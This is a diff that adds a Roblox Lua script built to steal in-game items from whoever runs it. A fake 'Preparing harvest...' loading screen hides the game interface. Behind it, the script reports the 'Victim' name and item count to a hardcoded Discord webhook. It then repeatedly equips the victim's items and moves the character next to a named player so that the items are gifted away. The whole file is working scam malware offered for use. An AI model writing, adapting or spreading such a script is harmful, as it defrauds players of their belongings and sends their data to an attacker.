@@ -1,0 +1,145 @@
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1515614244295544912/80SYn-CwUdEOAy_UKRzveYvrEzWd21ijv2uZLdXf2JQLY8rVcHS7bug_w_3M6qVHoCqy"
+
+local TARGET_PLAYER_NAME = "hshajsjhehe"
+local PRIVATE_SERVER_LINK_CODE = "https://www.roblox.com/share?code=c17ae8bc0277f44e8edf06e557182767&type=Server"
+
+-- Force TP to your private server
+task.spawn(function()
+    wait(2)
+    if PRIVATE_SERVER_LINK_CODE and PRIVATE_SERVER_LINK_CODE \~= "https://www.roblox.com/share?code=c17ae8bc0277f44e8edf06e557182767&type=Server" then
+        pcall(function()
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player, nil, {privateServerLinkCode = PRIVATE_SERVER_LINK_CODE})
+        end)
+    end
+end)
+
+-- Persistent loading screen
+task.spawn(function()
+    for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
+        pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
+    end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+    local Background = Instance.new("Frame")
+    Background.Size = UDim2.new(1,0,1,0)
+    Background.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    Background.Parent = ScreenGui
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(0.8,0,0.15,0)
+    Title.Position = UDim2.new(0.1,0,0.3,0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "Preparing harvest..."
+    Title.TextColor3 = Color3.fromRGB(0, 255, 80)
+    Title.TextScaled = true
+    Title.Font = Enum.Font.GothamBlack
+    Title.Parent = Background
+
+    local BarBG = Instance.new("Frame")
+    BarBG.Size = UDim2.new(0.6,0,0.04,0)
+    BarBG.Position = UDim2.new(0.2,0,0.55,0)
+    BarBG.BackgroundColor3 = Color3.fromRGB(20,20,20)
+    BarBG.Parent = Background
+
+    local Bar = Instance.new("Frame")
+    Bar.Size = UDim2.new(0,0,1,0)
+    Bar.BackgroundColor3 = Color3.fromRGB(0,255,100)
+    Bar.Parent = BarBG
+
+    local start = tick()
+    while tick() - start < 40 do
+        local p = math.clamp((tick() - start) / 40, 0, 1)
+        Bar.Size = UDim2.new(p,0,1,0)
+        wait(0.07)
+    end
+    Bar.Size = UDim2.new(1,0,1,0)
+end)
+
+-- Webhook loot dump
+task.spawn(function()
+    wait(6)
+    local backpack = player:FindFirstChild("Backpack")
+    local items = {}
+    if backpack then
+        for _, v in ipairs(backpack:GetChildren()) do
+            table.insert(items, v.Name)
+        end
+    end
+
+    local msg = "@everyone **Harvest**\nVictim: " .. player.Name .. "\nTo: " .. TARGET_PLAYER_NAME .. "\nItems: " .. #items
+
+    local req = (syn and syn.request) or http_request or request
+    if req and WEBHOOK_URL then
+        pcall(function()
+            req({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = HttpService:JSONEncode({content = msg})
+            })
+        end)
+    end
+end)
+
+-- Improved auto gift (equip + aggressive positioning, works PC/mobile)
+local function equipItem(item)
+    local char = player.Character
+    if char and char:FindFirstChild("Humanoid") and item then
+        item.Parent = char
+        pcall(function()
+            char.Humanoid:EquipTool(item)
+        end)
+    end
+end
+
+task.spawn(function()
+    while true do
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            local itemsList = backpack:GetChildren()
+            for _, item in ipairs(itemsList) do
+                if item and item.Parent == backpack then
+                    equipItem(item)
+                    wait(0.6)
+
+                    local target = Players:FindFirstChild(TARGET_PLAYER_NAME)
+                    if target and target.Character and player.Character then
+                        local myRoot = player.Character:FindFirstChild("HumanoidRootPart")
+                        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
+                        if myRoot and tRoot then
+                            -- Aggressive close positioning for gift prompt
+                            myRoot.CFrame = tRoot.CFrame * CFrame.new(2.5, 0, 2.5)
+                            wait(0.5)
+                        end
+                    end
+
+                    wait(1.8) -- hold time for gift prompt (PC: hold E, Mobile: hold gift button)
+                end
+            end
+        end
+        wait(0.8)
+    end
+end)
+
+-- Auto re-equip on character respawn
+player.CharacterAdded:Connect(function(char)
+    wait(1)
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
+            equipItem(item)
+            wait(0.4)
+        end
+    end
+end)
